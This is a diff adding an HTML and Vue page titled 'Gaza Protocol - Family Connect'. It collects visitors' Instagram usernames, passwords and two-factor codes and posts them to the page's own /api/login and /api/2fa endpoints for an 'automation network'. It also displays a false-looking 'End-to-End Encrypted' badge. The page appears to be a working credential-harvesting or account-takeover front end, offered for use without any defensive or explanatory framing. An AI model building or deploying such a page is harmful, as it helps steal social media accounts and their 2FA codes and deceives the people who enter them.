@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gaza Protocol - Family Connect</title>
+    <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap');
+        body { font-family: 'Inter', sans-serif; background-color: #f3f4f6; }
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 3px solid #3498db;
+            width: 20px;
+            height: 20px;
+            -webkit-animation: spin 1s linear infinite; /* Safari */
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div id="app" class="min-h-screen flex items-center justify-center px-4">
+        <div class="max-w-md w-full bg-white rounded-lg shadow-lg p-8">
+            
+            <!-- Header -->
+            <div class="text-center mb-8">
+                <h1 class="text-2xl font-bold text-gray-800">Family Connect</h1>
+                <p class="text-gray-500 text-sm mt-2">Connect your Instagram to the automation network.</p>
+            </div>
+
+            <!-- Success State -->
+            <div v-if="step === 'success'" class="text-center">
+                <div class="mx-auto flex items-center justify-center h-12 w-12 rounded-full bg-green-100 mb-4">
+                    <svg class="h-6 w-6 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
+                </div>
+                <h3 class="text-lg font-medium text-gray-900">Connected Successfully</h3>
+                <p class="text-sm text-gray-500 mt-2">Your account is now linked securely. You can close this page.</p>
+            </div>
+
+            <!-- Login Form -->
+            <div v-if="step === 'login'">
+                <form @submit.prevent="handleLogin">
+                    <div class="mb-4">
+                        <label class="block text-gray-700 text-sm font-bold mb-2">Instagram Username</label>
+                        <input v-model="form.username" type="text" class="w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" required placeholder="@username">
+                    </div>
+                    <div class="mb-6">
+                        <label class="block text-gray-700 text-sm font-bold mb-2">Password</label>
+                        <input v-model="form.password" type="password" class="w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" required placeholder="••••••••">
+                    </div>
+                    <button :disabled="loading" type="submit" class="w-full bg-black text-white font-bold py-3 rounded-lg hover:bg-gray-800 transition flex justify-center items-center">
+                        <span v-if="!loading">Connect Account</span>
+                        <div v-else class="loader"></div>
+                    </button>
+                </form>
+            </div>
+
+            <!-- 2FA Form -->
+            <div v-if="step === '2fa'">
+                <p class="text-sm text-gray-600 mb-4 text-center">Instagram sent a code to your phone/email. Please enter it below.</p>
+                <form @submit.prevent="handle2FA">
+                    <div class="mb-6">
+                        <label class="block text-gray-700 text-sm font-bold mb-2">Security Code</label>
+                        <input v-model="form.code" type="text" class="w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-center text-xl tracking-widest" required placeholder="123456">
+                    </div>
+                    <button :disabled="loading" type="submit" class="w-full bg-blue-600 text-white font-bold py-3 rounded-lg hover:bg-blue-700 transition flex justify-center items-center">
+                        <span v-if="!loading">Verify Code</span>
+                        <div v-else class="loader"></div>
+                    </button>
+                </form>
+            </div>
+
+            <!-- Error Message -->
+            <div v-if="error" class="mt-4 p-3 bg-red-50 text-red-700 text-sm rounded border border-red-200">
+                {{ error }}
+            </div>
+
+            <div class="mt-6 text-center">
+                <p class="text-xs text-gray-400">
+                    <span class="inline-block w-2 h-2 bg-green-500 rounded-full mr-1"></span>
+                    End-to-End Encrypted
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const { createApp } = Vue
+
+        createApp({
+            data() { return { step: 'login', loading: false, error: null, form: { username: '', password: '', code: '' } } },
+            methods: {
+                async handleLogin() {
+                    this.loading = true; this.error = null;
+                    try {
+                        const res = await fetch('/api/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username: this.form.username, password: this.form.password }) });
+                        const data = await res.json();
+                        if (data.status === 'SUCCESS') this.step = 'success';
+                        else if (data.status === '2FA_REQUIRED') this.step = '2fa';
+                        else this.error = data.error || 'Login failed';
+                    } catch (e) { this.error = 'Connection error. Please try again.'; } finally { this.loading = false; }
+                },
+                async handle2FA() {
+                    this.loading = true; this.error = null;
+                    try {
+                        const res = await fetch('/api/2fa', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username: this.form.username, code: this.form.code }) });
+                        const data = await res.json();
+                        if (data.status === 'SUCCESS') this.step = 'success';
+                        else this.error = data.error || 'Verification failed';
+                    } catch (e) { this.error = 'Connection error'; } finally { this.loading = false; }
+                }
+            }
+        }).mount('#app')
+    </script>
+</body>
+</html>
